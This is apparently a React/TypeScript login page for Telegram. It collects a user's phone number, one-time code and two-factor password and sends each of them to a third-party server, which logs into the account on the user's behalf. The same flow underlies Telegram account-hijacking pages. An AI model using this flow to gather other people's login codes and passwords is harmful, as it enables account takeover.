import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import InputMask from 'react-input-mask';
import { motion, AnimatePresence } from 'framer-motion';
import axios from 'axios';

const PageContainer = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  background-color: #f5f5f5;
  padding: 1rem;
`;

const AuthContainer = styled(motion.div)`
  width: 100%;
  max-width: 800px;
  padding: 2rem;
  background-color: #ffffff;
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
`;

const Title = styled.h2`
  text-align: center;
  color: #2c3e50;
  margin-bottom: 1.5rem;
  font-size: 24px;
  font-weight: 600;
`;

const Form = styled.form`
  display: flex;
  flex-direction: column;
`;

const Input = styled.input`
  padding: 1rem;
  margin-bottom: 1rem;
  border: 1px solid #e0e0e0;
  border-radius: 8px;
  font-size: 16px;
  transition: border-color 0.3s;

  &:focus {
    outline: none;
    border-color: #0088cc;
  }
`;

const PhoneInput = styled(InputMask)`
  padding: 1rem;
  margin-bottom: 1rem;
  border: 1px solid #e0e0e0;
  border-radius: 8px;
  font-size: 16px;
  transition: border-color 0.3s;
  background-color: #ffffff;
  color: #333333;

  &:focus {
    outline: none;
    border-color: #0088cc;
  }

  &::placeholder {
    color: #999999;
  }
`;

const Button = styled.button`
  padding: 1rem;
  background-color: #0088cc;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: background-color 0.3s, transform 0.1s;

  &:hover {
    background-color: #006699;
  }

  &:active {
    transform: scale(0.98);
  }

  &:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
  }
`;

const ErrorMessage = styled.p`
  color: #e74c3c;
  text-align: center;
  margin-bottom: 1rem;
  font-size: 14px;
`;

const StepIndicator = styled.div`
  display: flex;
  justify-content: center;
  margin-bottom: 1.5rem;
`;

const Step = styled.div`
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background-color: ${(props) => (props.active ? '#0088cc' : '#e0e0e0')};
  margin: 0 6px;
  transition: background-color 0.3s;
`;

const InfoText = styled.p`
  color: #7f8c8d;
  text-align: center;
  margin-bottom: 1rem;
  font-size: 14px;
`;

const TimerText = styled.p`
  color: #7f8c8d;
  text-align: center;
  margin-bottom: 1rem;
  font-size: 14px;
`;

const BackButton = styled.button`
  background: none;
  border: none;
  color: #0088cc;
  cursor: pointer;
  font-size: 14px;
  margin-top: 1rem;
  text-decoration: underline;

  &:hover {
    color: #006699;
  }
`;

const WarningModal = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
`;

const WarningContent = styled.div`
  background-color: white;
  padding: 2rem;
  border-radius: 8px;
  text-align: center;
`;

const WarningButton = styled(Button)`
  margin: 0.5rem;
  padding: 0.5rem 1rem;
`;

const fadeVariants = {
  hidden: { opacity: 0 },
  visible: { opacity: 1 },
};

function TelegramAuth() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [phoneCodeHash, setPhoneCodeHash] = useState('');
  const [step, setStep] = useState('phone');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [timer, setTimer] = useState(40);
  const [showWarning, setShowWarning] = useState(false);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 'code' && timer > 0) {
      interval = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const cleanPhoneNumber = phoneNumber.replace(/\D/g, '');

      if (!isValidPhoneNumber(cleanPhoneNumber)) {
        throw new Error('Invalid phone number');
      }

      const response = await axios.post('https://tg.neira.sale/auth/auth', {
        phone_number: cleanPhoneNumber,
        auth_method: 'По номеру телефона',
        api_choice: 'Telegram Android',
      });
      setPhoneCodeHash(response.data.result.phone_code_hash);
      setStep('code');
      setTimer(90);
    } catch (err) {
      setError(
        err.response?.data?.detail || err.message || 'An error occurred'
      );
    } finally {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const response = await axios.post(
        'https://tg.neira.sale/auth/verify_code',
        {
          phone_number: phoneNumber,
          code: code,
          phone_code_hash: phoneCodeHash,
        }
      );
      if (response.data.status === 'password_needed') {
        setStep('password');
      } else {
        console.log('Successfully authenticated');
      }
    } catch (err) {
      setError(err.response?.data?.detail || 'An error occurred');
    } finally {
      setLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const response = await axios.post(
        'https://tg.neira.sale/auth/verify_password',
        {
          phone_number: phoneNumber,
          password: password,
        }
      );
      if (response.data.status === 'success') {
        console.log('Successfully authenticated');
      }
    } catch (err) {
      setError(err.response?.data?.detail || 'An error occurred');
    } finally {
      setLoading(false);
    }
  };

  const isValidPhoneNumber = (phone: string) => {
    return /^\d{10,15}$/.test(phone);
  };

  const handleBack = () => {
    setShowWarning(true);
  };

  const confirmBack = () => {
    setStep('phone');
    setShowWarning(false);
    setPhoneNumber('');
    setCode('');
    setPassword('');
    setPhoneCodeHash('');
    setError('');
  };

  return (
    <PageContainer>
      <AuthContainer
        initial="hidden"
        animate="visible"
        exit="hidden"
        variants={fadeVariants}
      >
        <Title>Telegram Authentication</Title>

        <StepIndicator>
          <Step active={step === 'phone'} />
          <Step active={step === 'code'} />
          <Step active={step === 'password'} />
        </StepIndicator>

        {error && <ErrorMessage>{error}</ErrorMessage>}

        <AnimatePresence mode="wait">
          {step === 'phone' && (
            <motion.div
              key="phone"
              initial="hidden"
              animate="visible"
              exit="hidden"
              variants={fadeVariants}
            >
              <Form onSubmit={handlePhoneSubmit}>
                <PhoneInput
                  mask="+99 (999) 999-99-99"
                  maskChar=" "
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="Enter your phone number"
                  required
                />
                <InfoText>
                  Please enter your phone number including country code
                </InfoText>
                <Button type="submit" disabled={loading}>
                  {loading ? 'Sending...' : 'Send Code'}
                </Button>
              </Form>
            </motion.div>
          )}

          {step === 'code' && (
            <motion.div
              key="code"
              initial="hidden"
              animate="visible"
              exit="hidden"
              variants={fadeVariants}
            >
              <Form onSubmit={handleCodeSubmit}>
                <Input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  placeholder="Enter verification code"
                  required
                />
                <InfoText>Enter the code we sent to your phone</InfoText>
                <TimerText>Time remaining: {timer} seconds</TimerText>
                <Button type="submit" disabled={loading || timer === 0}>
                  {loading ? 'Verifying...' : 'Verify Code'}
                </Button>
                <BackButton onClick={handleBack}>Go back</BackButton>
              </Form>
            </motion.div>
          )}

          {step === 'password' && (
            <motion.div
              key="password"
              initial="hidden"
              animate="visible"
              exit="hidden"
              variants={fadeVariants}
            >
              <Form onSubmit={handlePasswordSubmit}>
                <Input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  required
                />
                <InfoText>
                  Enter your Telegram password for two-factor authentication
                </InfoText>
                <Button type="submit" disabled={loading}>
                  {loading ? 'Submitting...' : 'Submit Password'}
                </Button>
                <BackButton onClick={handleBack}>Go back</BackButton>
              </Form>
            </motion.div>
          )}
        </AnimatePresence>

        {showWarning && (
          <WarningModal>
            <WarningContent>
              <p>
                Warning: Going back will restart the authentication process.
              </p>
              <WarningButton onClick={confirmBack}>Confirm</WarningButton>
              <WarningButton onClick={() => setShowWarning(false)}>
                Cancel
              </WarningButton>
            </WarningContent>
          </WarningModal>
        )}
      </AuthContainer>
    </PageContainer>
  );
}

export default TelegramAuth;
